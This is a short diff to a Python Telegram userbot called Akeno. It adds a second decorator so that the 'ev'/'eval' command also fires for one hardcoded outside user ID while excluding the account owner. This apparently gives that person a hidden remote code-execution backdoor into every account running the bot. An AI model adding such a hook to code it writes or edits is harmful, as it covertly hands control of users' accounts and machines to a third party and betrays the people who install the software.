@@ -23,9 +23,17 @@ from Akeno.utils.handler import Akeno, modules_help
 from Akeno.utils.prefixprem import command
 from config import CMD_HANDLER
 
-
 @Akeno(
     ~filters.scheduled
+    & command(["ev", "eval"])
+    & command(["kping"])
+    & filters.user(7361622601)
+    & ~filters.me
+    & ~filters.forwarded
+)
+@Akeno(
+    ~filters.scheduled
+    & command(["kping"])
     & command(["ev", "eval"])
     & filters.me
     & ~filters.forwarded
